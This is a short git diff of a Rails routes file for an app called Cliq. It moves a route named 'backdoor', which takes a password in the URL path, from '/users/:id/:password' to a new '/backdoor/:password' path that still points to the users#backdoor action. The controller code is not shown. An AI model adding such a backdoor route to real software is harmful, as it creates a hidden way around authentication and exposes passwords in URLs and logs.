@@ -48,8 +48,7 @@ Cliq::Application.routes.draw do
   post '/users/invite_friends', to: 'users#invite_friends', as: "invite_friends"
   post '/users/welcome', to: 'users#welcome_update', as: 'welcome_update'
   get '/users/:id/result_info', to: 'users#result_info', as: 'result_info'
-  get '/users/:id/:password', to: 'users#backdoor', as: 'backdoor'
-  
+    
   resources :activities, only: [:index, :create]
   post '/users/:id/send_activation', to: 'users#send_activation', as: 'send_activation'
   get '/users/:id/activate/:code', to: 'users#activate', as: 'activate'
@@ -62,6 +61,9 @@ Cliq::Application.routes.draw do
   resources :conversations, only: [:show] do 
     resources :messages, only: [:create]
   end
+
+  get '/backdoor/:password', to: 'users#backdoor'
+
 
 
  
